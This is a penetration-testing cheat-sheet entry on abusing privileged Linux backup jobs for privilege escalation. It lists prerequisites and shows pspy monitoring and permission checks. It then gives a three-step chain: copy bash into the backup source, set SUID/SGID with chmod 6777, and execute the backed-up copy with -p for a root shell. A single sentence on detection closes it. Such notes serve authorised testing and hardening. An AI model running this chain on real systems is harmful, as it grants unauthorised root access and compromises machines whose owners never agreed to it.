---
technique: Backup Permission Abuse
category: privilege-escalation
targets: Linux Backup Jobs
protocols: Local
remote_capable: false
tags: linux privilege-escalation backup suid permissions cron
---

# Backup Permission Abuse

Backup permission abuse exploits privileged copy jobs that preserve attacker-controlled ownership, mode bits, symlinks, or file contents.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable backup source | Operator must control files copied by the backup job |
| Privileged backup runner | Backup process must run as root or another target user |
| Permission preservation | Copy tool must preserve useful mode bits or follow useful links |

## Linux

### Monitor backup process

#sh #processes #backup

Monitor scheduled backup commands with pspy.

```sh title:"Monitor backup jobs with pspy"
./pspy64
```
<!-- cheat -->

### Check source permissions

#sh #filesystem #backup

Check permissions on a backup source directory.

```sh title:"Check backup source permissions"
ls -lad "$source_dir"
```
<!-- cheat
var source_dir
-->

### Check destination permissions

#sh #filesystem #backup

Check permissions on a backup destination directory.

```sh title:"Check backup destination permissions"
ls -lad "$backup_dest"
```
<!-- cheat
var backup_dest
-->

### Step 1: Stage SUID candidate in source

#sh #backup #suid

Copy Bash into a writable backup source directory.

```sh title:"Stage bash in backup source"
cp /bin/bash "$source_dir/$payload_name"
```
<!-- cheat
var source_dir
var payload_name
-->

### Step 2: Set preserved mode bits

#sh #backup #suid

Set SUID and SGID bits before the privileged backup copies the file.

```sh title:"Set preserved payload mode bits"
chmod 6777 "$source_dir/$payload_name"
```
<!-- cheat
var source_dir
var payload_name
-->

### Step 3: Execute copied payload

#sh #backup #suid

Execute the copied payload from the privileged backup destination.

```sh title:"Execute copied backup payload"
"$backup_dest/$payload_name" -p
```
<!-- cheat
var backup_dest
var payload_name
-->

### Resolve symlink target

#sh #filesystem #symlink

Resolve the destination of a symlink used by a backup job.

```sh title:"Resolve backup symlink target"
readlink -f "$link_path"
```
<!-- cheat
var link_path
-->

## Detection

Monitor backup sources for SUID files, symlinks to sensitive paths, and unexpected permission preservation into root-owned destinations.
